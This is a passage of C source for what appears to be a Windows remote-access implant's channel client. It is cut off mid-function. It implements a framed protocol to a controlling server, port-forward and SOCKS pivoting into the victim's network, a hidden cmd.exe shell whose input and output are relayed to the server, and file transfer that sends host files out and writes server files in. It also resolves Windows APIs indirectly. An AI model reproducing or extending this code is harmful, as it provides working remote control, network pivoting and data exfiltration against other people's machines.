#include "WispRcp.h"
#include "WispDefines.h"
#include "WispJson.h"
#include "WispCrypto.h"
#include "ApiLoader.h"
#include "utils.h"

#include <stdint.h>

// Type2 RCP client: framing, handshake, channel table, keepalive and the fwd
// channel (server-side SOCKS5/port-forward bridge into the agent network).

#if defined(DEBUG)
static void rcp_log(const char* s)
{
	HANDLE h = GetStdHandle(STD_ERROR_HANDLE);
	DWORD w = 0;
	if (h && h != INVALID_HANDLE_VALUE)
		WriteFile(h, s, StrLenA((CHAR*)s), &w, NULL);
}
#define RLOG(...) do { char __lb[384]; if (ApiWin && ApiWin->snprintf) { ApiWin->snprintf(__lb, sizeof(__lb), __VA_ARGS__); rcp_log(__lb); } } while (0)
#else
#define RLOG(...) do { } while (0)
#endif

#define RCP_HEADER_LEN 19
#define RCP_MAX_FRAME  (16 * 1024 * 1024)

#define RCP_KIND_HELLO 0x01
#define RCP_KIND_ACK   0x02
#define RCP_KIND_OPEN  0x03
#define RCP_KIND_FRAME 0x04
#define RCP_KIND_CLOSE 0x05
#define RCP_KIND_PING  0x06
#define RCP_KIND_PONG  0x07

typedef struct {
	uint32_t chan;
	BYTE     kind;
	BYTE     flags;
	uint32_t seq;
	uint32_t len;
	BYTE*    payload;
} RCP_FRAME;

typedef struct RCP_FNODE {
	struct RCP_FNODE* next;
	ULONG  len;
	BYTE   flags;
	BYTE   data[1];
} RCP_FNODE;

typedef struct RCP_CHAN {
	uint32_t id;
	int      kind;          // 1 = fwd, 2 = shell
	SOCKET   sock;
	HANDLE   inW;           // shell stdin (parent write end)
	HANDLE   outR;          // shell stdout/stderr (parent read end)
	HANDLE   proc;          // shell process
	HANDLE   job;           // kill-on-close job for the shell tree
	DWORD    pid;           // shell process id (fallback termination)
	RCP_FNODE* qhead;       // file channel queue (raw chunks + JSON ctrl)
	RCP_FNODE* qtail;
	ULONG      qbytes;
	HANDLE     evt;
	volatile LONG stop;
	char     target[256];
	BYTE*    pend;          // frames received before the target dial completed
	ULONG    pendLen;
	ULONG    pendCap;
	struct RCP_CHAN* next;
} RCP_CHAN;

static void shell_cleanup(RCP_CHAN* c);

static volatile LONG g_wanted = 0;
static HANDLE        g_thread = NULL;
static SOCKET        g_sock = INVALID_SOCKET;
static char          g_addr[256];
static char          g_token[128];
static char          g_agent[64];
static uint32_t      g_seq = 0;
static RCP_CHAN*     g_chans = NULL;
static CRITICAL_SECTION g_sendCs;
static CRITICAL_SECTION g_chanCs;
static BOOL          g_csInit = FALSE;

static void ensure_cs(void)
{
	if (!g_csInit) {
		InitializeCriticalSection(&g_sendCs);
		InitializeCriticalSection(&g_chanCs);
		g_csInit = TRUE;
	}
}

static void copy_str(char* dst, ULONG cap, const char* src)
{
	ULONG i = 0;
	if (!dst || cap == 0) return;
	if (src) {
		while (src[i] && i + 1 < cap) { dst[i] = src[i]; i++; }
	}
	dst[i] = 0;
}

static const char* wj_str(WJVal* v)
{
	return v && v->type == WJ_STR ? v->str : NULL;
}

static uint32_t be32(const BYTE* p)
{
	return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

static void put32(BYTE* p, uint32_t v)
{
	p[0] = (BYTE)(v >> 24);
	p[1] = (BYTE)(v >> 16);
	p[2] = (BYTE)(v >> 8);
	p[3] = (BYTE)v;
}

static BOOL send_all(SOCKET s, const BYTE* data, ULONG len)
{
	ULONG off = 0;
	while (off < len) {
		int r = ApiWin->send(s, (const char*)data + off, (int)(len - off), 0);
		if (r <= 0)
			return FALSE;
		off += (ULONG)r;
	}
	return TRUE;
}

static BOOL recv_all(SOCKET s, BYTE* data, ULONG len)
{
	ULONG off = 0;
	while (off < len) {
		int r = ApiWin->recv(s, (char*)data + off, (int)(len - off), 0);
		if (r <= 0)
			return FALSE;
		off += (ULONG)r;
	}
	return TRUE;
}

static BOOL rcp_send(uint32_t chan, BYTE kind, BYTE flags, const void* data, ULONG len)
{
	BYTE h[RCP_HEADER_LEN];
	BOOL ok;
	if (!g_sock || g_sock == INVALID_SOCKET)
		return FALSE;
	ensure_cs();
	EnterCriticalSection(&g_sendCs);
	h[0] = 'W'; h[1] = 'R'; h[2] = 'C'; h[3] = 'P';
	h[4] = 1;
	put32(h + 5, chan);
	h[9] = kind;
	h[10] = flags;
	put32(h + 11, ++g_seq);
	put32(h + 15, len);
	ok = send_all(g_sock, h, RCP_HEADER_LEN);
	if (ok && len)
		ok = send_all(g_sock, (const BYTE*)data, len);
	LeaveCriticalSection(&g_sendCs);
	return ok;
}

static BOOL rcp_read(SOCKET s, RCP_FRAME* f)
{
	BYTE h[RCP_HEADER_LEN];
	memset(f, 0, sizeof(*f));
	if (!recv_all(s, h, RCP_HEADER_LEN))
		return FALSE;
	if (h[0] != 'W' || h[1] != 'R' || h[2] != 'C' || h[3] != 'P' || h[4] != 1)
		return FALSE;
	f->chan = be32(h + 5);
	f->kind = h[9];
	f->flags = h[10];
	f->seq = be32(h + 11);
	f->len = be32(h + 15);
	if (f->len > RCP_MAX_FRAME)
		return FALSE;
	if (f->len) {
		f->payload = (BYTE*)MemAllocLocal(f->len);
		if (!f->payload)
			return FALSE;
		if (!recv_all(s, f->payload, f->len)) {
			MemFreeLocal((LPVOID*)&f->payload, f->len);
			return FALSE;
		}
	}
	return TRUE;
}

static void frame_free(RCP_FRAME* f)
{
	if (f->payload) {
		MemFreeLocal((LPVOID*)&f->payload, f->len);
		f->payload = NULL;
	}
}

static void send_close(uint32_t chan, const char* reason)
{
	WJVal* c = WJNewObj();
	if (!c)
		return;
	WJObjPutNum(c, "chan", (double)chan);
	WJObjPutStr(c, "reason", reason ? reason : "closed");
	char* js = WJSerialize(c);
	if (js) {
		rcp_send(chan, RCP_KIND_CLOSE, 0, js, StrLenA(js));
		ULONG n = StrLenA(js);
		MemFreeLocal((LPVOID*)&js, n + 1);
	}
	WJFree(c);
}

//////// channel table ////////

static void chan_add(RCP_CHAN* c)
{
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	c->next = g_chans;
	g_chans = c;
	LeaveCriticalSection(&g_chanCs);
}

static RCP_CHAN* chan_find_locked(uint32_t id)
{
	RCP_CHAN* c = g_chans;
	while (c && c->id != id)
		c = c->next;
	return c;
}

static RCP_CHAN* chan_find(uint32_t id)
{
	RCP_CHAN* c;
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	c = chan_find_locked(id);
	LeaveCriticalSection(&g_chanCs);
	return c;
}

// Queue frames that arrive while the target dial is still in flight. The fwd
// thread flushes the queue under g_chanCs before exposing the socket.
static BOOL pend_append(RCP_CHAN* c, const BYTE* data, ULONG len)
{
	if (!len)
		return TRUE;
	if (c->pendLen + len > 4 * 1024 * 1024)
		return FALSE;
	if (c->pendLen + len > c->pendCap) {
		ULONG nc = c->pendCap ? c->pendCap : 4096;
		BYTE* nb;
		while (nc < c->pendLen + len)
			nc *= 2;
		nb = (BYTE*)MemAllocLocal(nc);
		if (!nb)
			return FALSE;
		if (c->pend) {
			memcpy(nb, c->pend, c->pendLen);
			MemFreeLocal((LPVOID*)&c->pend, c->pendCap);
		}
		c->pend = nb;
		c->pendCap = nc;
	}
	memcpy(c->pend + c->pendLen, data, len);
	c->pendLen += len;
	return TRUE;
}

static void pend_free(RCP_CHAN* c)
{
	if (c->pend) {
		MemFreeLocal((LPVOID*)&c->pend, c->pendCap);
		c->pend = NULL;
		c->pendLen = 0;
		c->pendCap = 0;
	}
}

// File channel queue: the RCP reader must never block on disk I/O.
static BOOL q_push(RCP_CHAN* c, const BYTE* data, ULONG len, BYTE flags)
{
	RCP_FNODE* n;
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	if (c->qbytes + len > (16u * 1024u * 1024u)) {
		LeaveCriticalSection(&g_chanCs);
		return FALSE;
	}
	n = (RCP_FNODE*)MemAllocLocal(sizeof(RCP_FNODE) + len);
	if (!n) {
		LeaveCriticalSection(&g_chanCs);
		return FALSE;
	}
	n->next = NULL;
	n->len = len;
	n->flags = flags;
	if (len)
		memcpy(n->data, data, len);
	if (!c->qhead)
		c->qhead = n;
	else
		c->qtail->next = n;
	c->qtail = n;
	c->qbytes += len;
	LeaveCriticalSection(&g_chanCs);
	if (c->evt)
		ApiWin->SetEvent(c->evt);
	return TRUE;
}

static RCP_FNODE* q_pop(RCP_CHAN* c)
{
	RCP_FNODE* n;
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	n = c->qhead;
	if (n) {
		c->qhead = n->next;
		if (!c->qhead)
			c->qtail = NULL;
		c->qbytes -= n->len;
		n->next = NULL;
	}
	LeaveCriticalSection(&g_chanCs);
	return n;
}

static void q_node_free(RCP_FNODE* n)
{
	if (n)
		MemFreeLocal((LPVOID*)&n, sizeof(RCP_FNODE) + n->len);
}

static void q_clear(RCP_CHAN* c)
{
	RCP_FNODE* n;
	while ((n = q_pop(c)) != NULL)
		q_node_free(n);
}

static void chan_remove(RCP_CHAN* c)
{
	RCP_CHAN** p;
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	p = &g_chans;
	while (*p && *p != c)
		p = &(*p)->next;
	if (*p == c)
		*p = c->next;
	LeaveCriticalSection(&g_chanCs);
}

static void chan_stop_all(void)
{
	RCP_CHAN* c;
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	c = g_chans;
	g_chans = NULL;
	LeaveCriticalSection(&g_chanCs);
	for (; c; c = c->next) {
		ensure_cs();
		EnterCriticalSection(&g_chanCs);
		InterlockedExchange(&c->stop, 1);
		if (c->kind == 2)
			shell_cleanup(c);
		else if (c->kind == 3) {
			if (c->evt)
				ApiWin->SetEvent(c->evt);
		}
		else if (c->sock != INVALID_SOCKET) {
			ApiWin->closesocket(c->sock);
			c->sock = INVALID_SOCKET;
		}
		pend_free(c);
		LeaveCriticalSection(&g_chanCs);
	}
}

//////// TCP helpers ////////

static uint32_t bswap32(uint32_t v)
{
	return ((v & 0x000000FFu) << 24) | ((v & 0x0000FF00u) << 8) |
		((v & 0x00FF0000u) >> 8) | ((v & 0xFF000000u) >> 24);
}

static SOCKET tcp_connect(const char* target)
{
	char host[256];
	const char* p = target;
	const char* colon = NULL;
	const char* q;
	ULONG n, i;
	USHORT port = 0;
	struct sockaddr_in sa;
	SOCKET s;

	if (!target)
		return INVALID_SOCKET;
	if (StrNCmpA((CHAR*)p, (CHAR*)"tcp://", 6) == 0)
		p += 6;
	for (q = p; *q; q++)
		if (*q == ':') colon = q;
	if (!colon)
		return INVALID_SOCKET;
	n = (ULONG)(colon - p);
	if (n == 0 || n >= sizeof(host))
		return INVALID_SOCKET;
	for (i = 0; i < n; i++) host[i] = p[i];
	host[n] = 0;
	for (q = colon + 1; *q >= '0' && *q <= '9'; q++)
		port = (USHORT)(port * 10 + (*q - '0'));
	if (port == 0)
		return INVALID_SOCKET;

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = _htons(port);
	{
		ULONG ip = _inet_addr(host);
		if (ip == 0xFFFFFFFF) {
			struct hostent* he = ApiWin->gethostbyname(host);
			if (!he || !he->h_addr_list || !he->h_addr_list[0])
				return INVALID_SOCKET;
			memcpy(&sa.sin_addr, he->h_addr_list[0], 4);
		}
		else {
			sa.sin_addr.s_addr = bswap32(ip);
		}
	}

	s = ApiWin->socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
		return INVALID_SOCKET;
	if (ApiWin->connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
		ApiWin->closesocket(s);
		return INVALID_SOCKET;
	}
	return s;
}

//////// fwd channel ////////

static DWORD WINAPI fwd_thread(LPVOID param)
{
	RCP_CHAN* c = (RCP_CHAN*)param;
	BYTE* buf = (BYTE*)MemAllocLocal(16 * 1024);
	SOCKET s;
	if (!buf) {
		send_close(c->id, "oom");
		InterlockedExchange(&c->stop, 1);
		chan_remove(c);
		return 0;
	}
	s = tcp_connect(c->target);
	if (s == INVALID_SOCKET) {
		send_close(c->id, "dial failed");
		ensure_cs();
		EnterCriticalSection(&g_chanCs);
		InterlockedExchange(&c->stop, 1);
		pend_free(c);
		LeaveCriticalSection(&g_chanCs);
		chan_remove(c);
		MemFreeLocal((LPVOID*)&buf, 16 * 1024);
		return 0;
	}
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	c->sock = s;
	if (c->pend) {
		send_all(s, c->pend, c->pendLen);
		pend_free(c);
	}
	LeaveCriticalSection(&g_chanCs);
	RLOG("[rcp] fwd chan %u -> %s\n", c->id, c->target);
	while (!InterlockedCompareExchange(&c->stop, 1, 1)) {
		int r = ApiWin->recv(s, (char*)buf, 16 * 1024, 0);
		if (r <= 0)
			break;
		if (!rcp_send(c->id, RCP_KIND_FRAME, 0, buf, (ULONG)r))
			break;
	}
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	if (c->sock != INVALID_SOCKET) {
		ApiWin->closesocket(c->sock);
		c->sock = INVALID_SOCKET;
	}
	pend_free(c);
	LeaveCriticalSection(&g_chanCs);
	MemFreeLocal((LPVOID*)&buf, 16 * 1024);
	send_close(c->id, InterlockedCompareExchange(&c->stop, 1, 1) ? "closed" : "eof");
	chan_remove(c);
	return 0;
}

static void start_fwd(uint32_t chan, const char* target)
{
	RCP_CHAN* c = (RCP_CHAN*)MemAllocLocal(sizeof(RCP_CHAN));
	HANDLE h;
	if (!c) {
		send_close(chan, "oom");
		return;
	}
	memset(c, 0, sizeof(*c));
	c->id = chan;
	c->kind = 1;
	c->sock = INVALID_SOCKET;
	copy_str(c->target, sizeof(c->target), target);
	chan_add(c);
	h = ApiWin->CreateThread(NULL, 0, fwd_thread, c, 0, NULL);
	if (h)
		ApiWin->CloseHandle(h);
}

//////// shell channel (pipes, cmd.exe /Q /K - Go agent parity) ////////

typedef HANDLE (WINAPI* PFN_CreateJobObjectA)(LPSECURITY_ATTRIBUTES, LPCSTR);
typedef BOOL (WINAPI* PFN_SetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, LPVOID, DWORD);
typedef BOOL (WINAPI* PFN_AssignProcessToJobObject)(HANDLE, HANDLE);

static HMODULE kernel32_mod(void)
{
	if (!ApiWin->GetModuleHandleA)
		return NULL;
	return ApiWin->GetModuleHandleA("kernel32.dll");
}

static void shell_cleanup(RCP_CHAN* c)
{
	RLOG("[rcp] shell cleanup id=%u proc=%p job=%p\n", c->id, (void*)c->proc, (void*)c->job);
	if (c->inW) {
		ApiWin->CloseHandle(c->inW);
		c->inW = NULL;
	}
	if (c->outR) {
		ApiWin->CloseHandle(c->outR);
		c->outR = NULL;
	}
	if (c->proc) {
		DWORD code1 = 0, code2 = 0, err = 0;
		BOOL ok;
		ApiWin->GetExitCodeProcess(c->proc, &code1);
		ok = TerminateProcess(c->proc, 0);
		err = ApiWin->GetLastError();
		ApiWin->GetExitCodeProcess(c->proc, &code2);
		RLOG("[rcp] term pid=%u proc=%p ok=%d err=%u code=%u->%u\n",
			c->pid, (void*)c->proc, ok, err, code1, code2);
		if (!ok && c->pid) {
			HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, c->pid);
			if (h) {
				TerminateProcess(h, 0);
				CloseHandle(h);
			}
		}
		ApiWin->CloseHandle(c->proc);
		c->proc = NULL;
	}
	if (c->job) {
		ApiWin->CloseHandle(c->job); // kill-on-close takes the child tree
		c->job = NULL;
	}
}

static DWORD WINAPI shell_reader(LPVOID param)
{
	RCP_CHAN* c = (RCP_CHAN*)param;
	BYTE* buf = (BYTE*)MemAllocLocal(4096);
	if (!buf) {
		ensure_cs();
		EnterCriticalSection(&g_chanCs);
		shell_cleanup(c);
		LeaveCriticalSection(&g_chanCs);
		send_close(c->id, "oom");
		chan_remove(c);
		return 0;
	}
	for (;;) {
		DWORD got = 0;
		if (!ApiWin->ReadFile(c->outR, buf, 4096, &got, NULL) || got == 0)
			break;
		if (!rcp_send(c->id, RCP_KIND_FRAME, 0, buf, got))
			break;
	}
	MemFreeLocal((LPVOID*)&buf, 4096);
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	shell_cleanup(c);
	LeaveCriticalSection(&g_chanCs);
	send_close(c->id, "shell ended");
	chan_remove(c);
	return 0;
}

static void start_shell(uint32_t chan)
{
	SECURITY_ATTRIBUTES sa;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	HANDLE hInR = NULL, hInW = NULL, hOutR = NULL, hOutW = NULL;
	RCP_CHAN* c;
	HANDLE th;
	char win[MAX_PATH];
	char cmd[512];
	ULONG i = 0, j;

	memset(&sa, 0, sizeof(sa));
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	if (!ApiWin->CreatePipe(&hInR, &hInW, &sa, 0)) {
		send_close(chan, "shell pipe failed");
		return;
	}
	if (!ApiWin->CreatePipe(&hOutR, &hOutW, &sa, 0)) {
		ApiWin->CloseHandle(hInR);
		ApiWin->CloseHandle(hInW);
		send_close(chan, "shell pipe failed");
		return;
	}
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hInR;
	si.hStdOutput = hOutW;
	si.hStdError = hOutW;

	win[0] = 0;
	if (ApiWin->GetWindowsDirectoryA)
		ApiWin->GetWindowsDirectoryA(win, MAX_PATH);
	if (!win[0]) {
		win[0] = 'C'; win[1] = ':'; win[2] = '\\'; win[3] = 'W'; win[4] = 'i';
		win[5] = 'n'; win[6] = 'd'; win[7] = 'o'; win[8] = 'w'; win[9] = 's'; win[10] = 0;
	}
	for (i = 0; win[i] && i + 32 < sizeof(cmd); i++)
		cmd[i] = win[i];
	for (j = 0; "\\system32\\cmd.exe /Q /K"[j] && i + 1 < sizeof(cmd); j++)
		cmd[i++] = "\\system32\\cmd.exe /Q /K"[j];
	cmd[i] = 0;

	memset(&pi, 0, sizeof(pi));
	if (!ApiWin->CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		ApiWin->CloseHandle(hInR);
		ApiWin->CloseHandle(hInW);
		ApiWin->CloseHandle(hOutR);
		ApiWin->CloseHandle(hOutW);
		send_close(chan, "shell start failed");
		return;
	}
	ApiWin->CloseHandle(hInR);
	ApiWin->CloseHandle(hOutW);
	ApiWin->CloseHandle(pi.hThread);

	c = (RCP_CHAN*)MemAllocLocal(sizeof(RCP_CHAN));
	if (!c) {
		ApiWin->CloseHandle(hInW);
		ApiWin->CloseHandle(hOutR);
		TerminateProcess(pi.hProcess, 0);
		ApiWin->CloseHandle(pi.hProcess);
		send_close(chan, "oom");
		return;
	}
	memset(c, 0, sizeof(*c));
	c->id = chan;
	c->kind = 2;
	c->sock = INVALID_SOCKET;
	c->inW = hInW;
	c->outR = hOutR;
	c->proc = pi.hProcess;
	c->pid = pi.dwProcessId;

	{
		HMODULE k = kernel32_mod();
		PFN_CreateJobObjectA cjo = k && ApiWin->GetProcAddress ? (PFN_CreateJobObjectA)ApiWin->GetProcAddress(k, "CreateJobObjectA") : NULL;
		PFN_SetInformationJobObject sijo = k && ApiWin->GetProcAddress ? (PFN_SetInformationJobObject)ApiWin->GetProcAddress(k, "SetInformationJobObject") : NULL;
		PFN_AssignProcessToJobObject apjo = k && ApiWin->GetProcAddress ? (PFN_AssignProcessToJobObject)ApiWin->GetProcAddress(k, "AssignProcessToJobObject") : NULL;
		if (cjo && sijo && apjo) {
			JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli;
			memset(&jeli, 0, sizeof(jeli));
			jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
			HANDLE job = cjo(NULL, NULL);
			if (job) {
				if (sijo(job, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli)) &&
					apjo(job, pi.hProcess))
					c->job = job;
				else
					ApiWin->CloseHandle(job);
			}
		}
	}

	chan_add(c);
	RLOG("[rcp] shell chan %u pid=%u proc=%p job=%p\n", chan, (unsigned)pi.dwProcessId, (void*)c->proc, (void*)c->job);
	th = ApiWin->CreateThread(NULL, 0, shell_reader, c, 0, NULL);
	if (th)
		ApiWin->CloseHandle(th);
	else {
		ensure_cs();
		EnterCriticalSection(&g_chanCs);
		shell_cleanup(c);
		LeaveCriticalSection(&g_chanCs);
		send_close(chan, "shell thread failed");
		chan_remove(c);
	}
}

//////// file channel (Type3: up = agent -> server, down = server -> agent) ////////

typedef struct FILE_CTX {
	RCP_CHAN* c;
	int       mode;          // 0 = up, 1 = down
	ULONG     chunk;
	char      job[80];
	char      path[512];
} FILE_CTX;

static void hex64(const BYTE* in, char* out)
{
	static const char* d = "0123456789abcdef";
	int i;
	for (i = 0; i < 32; i++) {
		out[i * 2] = d[in[i] >> 4];
		out[i * 2 + 1] = d[in[i] & 0xF];
	}
	out[64] = 0;
}

static void send_ctrl(uint32_t ch, const char* op, const char* job, const char* mode,
	const char* reason, LONG64 resume, const char* sha, int okv)
{
	WJVal* v = WJNewObj();
	char* js;
	ULONG n;
	if (!v)
		return;
	WJObjPutStr(v, "op", op);
	if (job) WJObjPutStr(v, "job", job);
	if (mode) WJObjPutStr(v, "mode", mode);
	if (reason) WJObjPutStr(v, "reason", reason);
	if (resume >= 0) WJObjPutNum(v, "resume", (double)resume);
	if (sha) WJObjPutStr(v, "sha256", sha);
	if (okv >= 0) WJObjPut(v, "ok", WJNewBool(okv ? TRUE : FALSE));
	js = WJSerialize(v);
	if (js) {
		rcp_send(ch, RCP_KIND_FRAME, 1, js, StrLenA(js));
		n = StrLenA(js);
		MemFreeLocal((LPVOID*)&js, n + 1);
	}
	WJFree(v);
}

static BOOL hash_file(const char* path, char* outHex)
{
	HANDLE f;
	WispSha256Ctx ctx;
	BYTE* buf;
	BYTE sum[32];
	BOOL ok = TRUE;
	f = ApiWin->CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return FALSE;
	if (!WispSha256Begin(&ctx)) {
		ApiWin->CloseHandle(f);
		return FALSE;
	}
	buf = (BYTE*)MemAllocLocal(64 * 1024);
	if (!buf) {
		WispSha256End(&ctx, sum);
		ApiWin->CloseHandle(f);
		return FALSE;
	}
	for (;;) {
		DWORD got = 0;
		if (!ApiWin->ReadFile(f, buf, 64 * 1024, &got, NULL)) { ok = FALSE; break; }
		if (!got) break;
		if (!WispSha256Update(&ctx, buf, got)) { ok = FALSE; break; }
	}
	MemFreeLocal((LPVOID*)&buf, 64 * 1024);
	ApiWin->CloseHandle(f);
	if (!WispSha256End(&ctx, sum))
		ok = FALSE;
	if (ok)
		hex64(sum, outHex);
	return ok;
}

static void file_finish(FILE_CTX* x)
{
	RCP_CHAN* c = x->c;
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	q_clear(c);
	if (c->evt) {
		ApiWin->CloseHandle(c->evt);
		c->evt = NULL;
	}
	LeaveCriticalSection(&g_chanCs);
	chan_remove(c);
	MemFreeLocal((LPVOID*)&x, sizeof(FILE_CTX));
}

static void file_up(FILE_CTX* x)
{
	RCP_CHAN* c = x->c;
	HANDLE f;
	BYTE* buf;
	LARGE_INTEGER li;
	LONG64 resume = 0;
	BOOL gotResume = FALSE;

	f = ApiWin->CreateFileA(x->path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE) {
		send_ctrl(c->id, "error", x->job, NULL, "open failed", -1, NULL, -1);
		return;
	}
	send_ctrl(c->id, "ready", x->job, "up", NULL, -1, NULL, -1);

	while (!InterlockedCompareExchange(&c->stop, 1, 1) && !gotResume) {
		RCP_FNODE* n;
		ApiWin->WaitForSingleObject(c->evt, 500);
		while ((n = q_pop(c)) != NULL) {
			if (n->flags & 1) {
				WJVal* v = WJParse((const char*)n->data, n->len);
				if (v) {
					const char* op = wj_str(WJObjGet(v, "op"));
					if (op && StrCmpA(op, "resume") == 0) {
						resume = WJNumAsI64(WJObjGet(v, "resume"), 0);
						gotResume = TRUE;
					}
					else if (op && StrCmpA(op, "error") == 0) {
						WJFree(v);
						q_node_free(n);
						ApiWin->CloseHandle(f);
						return;
					}
					WJFree(v);
				}
			}
			q_node_free(n);
		}
	}
	if (!gotResume || InterlockedCompareExchange(&c->stop, 1, 1)) {
		ApiWin->CloseHandle(f);
		return;
	}

	li.QuadPart = resume * (LONG64)x->chunk;
	SetFilePointerEx(f, li, NULL, FILE_BEGIN);
	buf = (BYTE*)MemAllocLocal(x->chunk);
	if (!buf) {
		send_ctrl(c->id, "error", x->job, NULL, "oom", -1, NULL, -1);
		ApiWin->CloseHandle(f);
		return;
	}
	for (;;) {
		DWORD got = 0;
		if (InterlockedCompareExchange(&c->stop, 1, 1))
			break;
		if (!ApiWin->ReadFile(f, buf, x->chunk, &got, NULL)) {
			send_ctrl(c->id, "error", x->job, NULL, "read failed", -1, NULL, -1);
			break;
		}
		if (got) {
			if (!rcp_send(c->id, RCP_KIND_FRAME, 0, buf, got))
				break;
		}
		if (got < x->chunk)
			break;
	}
	MemFreeLocal((LPVOID*)&buf, x->chunk);
	ApiWin->CloseHandle(f);
	if (InterlockedCompareExchange(&c->stop, 1, 1))
		return;
	{
		char hex[65];
		if (hash_file(x->path, hex))
			send_ctrl(c->id, "end", x->job, NULL, NULL, -1, hex, -1);
		else
			send_ctrl(c->id, "error", x->job, NULL, "hash failed", -1, NULL, -1);
	}
}

static void file_down(FILE_CTX* x)
{
	RCP_CHAN* c = x->c;
	char part[520];
	HANDLE f;
	DWORD sz;
	ULONG resume;
	LARGE_INTEGER li;
	ULONG i, j;
	BOOL running = TRUE;

	for (i = 0; x->path[i] && i + 1 < sizeof(part); i++)
		part[i] = x->path[i];
	for (j = 0; ".part"[j] && i + 1 < sizeof(part); j++)
		part[i++] = ".part"[j];
	part[i] = 0;

	f = ApiWin->CreateFileA(part, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE) {
		send_ctrl(c->id, "error", x->job, NULL, "open part failed", -1, NULL, -1);
		return;
	}
	sz = ApiWin->GetFileSize(f, NULL);
	if (sz == INVALID_FILE_SIZE)
		sz = 0;
	resume = sz / x->chunk;
	if (sz % x->chunk) {
		li.QuadPart = (LONG64)resume * x->chunk;
		SetFilePointerEx(f, li, NULL, FILE_BEGIN);
		SetEndOfFile(f);
	}
	li.QuadPart = (LONG64)resume * x->chunk;
	SetFilePointerEx(f, li, NULL, FILE_BEGIN);
	send_ctrl(c->id, "ready", x->job, "down", NULL, resume, NULL, -1);

	while (running && !InterlockedCompareExchange(&c->stop, 1, 1)) {
		RCP_FNODE* n;
		ApiWin->WaitForSingleObject(c->evt, 500);
		while ((n = q_pop(c)) != NULL) {
			if (n->flags & 1) {
				WJVal* v = WJParse((const char*)n->data, n->len);
				if (v) {
					const char* op = wj_str(WJObjGet(v, "op"));
					if (op && StrCmpA(op, "end") == 0) {
						const char* want = wj_str(WJObjGet(v, "sha256"));
						char hex[65];
						FlushFileBuffers(f);
						ApiWin->CloseHandle(f);
						f = INVALID_HANDLE_VALUE;
						if (!hash_file(part, hex)) {
							send_ctrl(c->id, "done", x->job, NULL, "hash failed", -1, NULL, 0);
						}
						else if (want && want[0] && StrCmpA((CHAR*)want, hex) != 0) {
							send_ctrl(c->id, "done", x->job, NULL, "sha256 mismatch", -1, hex, 0);
						}
						else {
							ApiWin->DeleteFileA(x->path);
							if (!ApiWin->MoveFileA(part, x->path))
								send_ctrl(c->id, "done", x->job, NULL, "rename failed", -1, hex, 0);
							else
								send_ctrl(c->id, "done", x->job, NULL, NULL, -1, hex, 1);
						}
						WJFree(v);
						q_node_free(n);
						return;
					}
					if (op && StrCmpA(op, "error") == 0) {
						const char* why = wj_str(WJObjGet(v, "reason"));
						send_ctrl(c->id, "done", x->job, NULL, why ? why : "server error", -1, NULL, 0);
						WJFree(v);
						q_node_free(n);
						ApiWin->CloseHandle(f);
						return;
					}
					WJFree(v);
				}
			}
			else {
				DWORD wr = 0;
				if (!ApiWin->WriteFile(f, n->data, n->len, &wr, NULL) || wr != n->len) {
					send_ctrl(c->id, "done", x->job, NULL, "write failed", -1, NULL, 0);
					q_node_free(n);
					ApiWin->CloseHandle(f);
					return;
				}
			}
			q_node_free(n);
		}
	}
	if (f != INVALID_HANDLE_VALUE)
		ApiWin->CloseHandle(f);
}

static DWORD WINAPI file_thread(LPVOID param)
{
	FILE_CTX* x = (FILE_CTX*)param;
	if (x->mode == 0)
		file_up(x);
	else
		file_down(x);
	file_finish(x);
	return 0;
}

static void start_file(uint32_t chan, WJVal* begin)
{
	const char* op;
	const char* mode;
	const char* job;
	const char* path;
	ULONG chunk;
	int m;
	FILE_CTX* x;
	RCP_CHAN* c;
	HANDLE th;

	if (!begin || begin->type != WJ_OBJ) {
		send_ctrl(chan, "error", NULL, NULL, "bad begin", -1, NULL, -1);
		return;
	}
	op = wj_str(WJObjGet(begin, "op"));
	mode = wj_str(WJObjGet(begin, "mode"));
	job = wj_str(WJObjGet(begin, "job"));
	path = wj_str(WJObjGet(begin, "path"));
	chunk = (ULONG)WJNumAsI64(WJObjGet(begin, "chunk"), 512 * 1024);
	if (!op || StrCmpA((CHAR*)op, (CHAR*)"begin") != 0 || !mode || !path || !path[0]) {
		send_ctrl(chan, "error", job, NULL, "bad begin", -1, NULL, -1);
		return;
	}
	if (StrCmpA((CHAR*)mode, (CHAR*)"up") == 0) m = 0;
	else if (StrCmpA((CHAR*)mode, (CHAR*)"down") == 0) m = 1;
	else {
